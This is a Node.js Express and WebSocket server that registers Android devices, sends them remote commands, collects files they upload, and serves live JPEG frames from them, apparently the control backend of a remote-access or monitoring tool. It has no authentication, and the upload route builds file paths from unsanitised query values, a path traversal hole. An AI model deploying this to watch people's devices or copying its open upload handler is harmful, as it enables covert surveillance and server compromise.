const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const port = 8080;

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)){
    fs.mkdirSync(uploadDir);
}

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

let deviceStatuses = {};
let deviceResponses = {};
let connectedDevices = {}; // deviceId -> ws connection
let lastFrame = null;

// --- WebSocket Logic ---
wss.on('connection', (ws, req) => {
    let currentDeviceId = 'unknown';

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register') {
                currentDeviceId = data.deviceId;
                connectedDevices[currentDeviceId] = ws;
                console.log(`🔌 Device Registered via WS: ${currentDeviceId}`);
            }
        } catch (e) { console.error("WS Message Error", e); }
    });

    ws.on('close', () => {
        if (connectedDevices[currentDeviceId] === ws) {
            delete connectedDevices[currentDeviceId];
            console.log(`❌ Device Disconnected: ${currentDeviceId}`);
        }
    });
});

// --- Android App Endpoints ---

// Still keeping this for backward compatibility or initial registration
app.post('/post-status', (req, res) => {
    const deviceId = req.body.deviceId || req.query.deviceId || 'unknown';
    deviceStatuses[deviceId] = {
        ...req.body,
        deviceId: deviceId,
        lastSeen: new Date().getTime()
    };
    res.json({ status: "ok" });
});

app.post('/post-response', (req, res) => {
    const deviceId = req.body.deviceId || 'unknown';
    console.log(`✅ Response from ${deviceId}:`, req.body);
    deviceResponses[deviceId] = req.body;
    res.json({ status: "ok" });
});

app.post('/upload-file', express.raw({ type: 'application/octet-stream', limit: '100mb' }), (req, res) => {
    const { fileName, deviceId } = req.query;
    const filePath = path.join(uploadDir, `${deviceId || 'unknown'}_${fileName || Date.now()}`);
    fs.writeFile(filePath, req.body, (err) => {
        if (err) return res.status(500).send("Error");
        res.json({ status: "ok" });
    });
});

app.post('/post-frame', express.raw({ type: 'image/jpeg', limit: '10mb' }), (req, res) => {
    lastFrame = req.body;
    res.status(200).send();
});

// --- UI Endpoints ---

app.post('/send-command', (req, res) => {
    const { deviceId, action, params } = req.body;
    if (!deviceId) return res.status(400).json({ error: "No deviceId" });

    const command = {
        id: Date.now().toString(),
        action,
        params: params || {}
    };

    const ws = connectedDevices[deviceId];
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(command));
        console.log(`🚀 Command sent INSTANTLY to ${deviceId}: ${action}`);
        res.json({ status: "Sent", deviceId });
    } else {
        console.log(`⚠️ Device ${deviceId} not connected via WS. Command discarded.`);
        res.status(404).json({ error: "Device not online" });
    }
});

app.get('/get-all-devices', (req, res) => res.json(deviceStatuses));

app.get('/get-device-data', (req, res) => {
    const deviceId = req.query.deviceId;
    res.json({
        status: deviceStatuses[deviceId] || {},
        response: deviceResponses[deviceId] || { status: "No data" }
    });
});

app.get('/live-frame', (req, res) => {
    if (lastFrame) {
        res.set('Content-Type', 'image/jpeg');
        res.send(lastFrame);
    } else res.status(404).send();
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

server.listen(port, '0.0.0.0', () => {
    console.log(`\n🚀 Real-time Server running at http://localhost:${port}\n`);
});
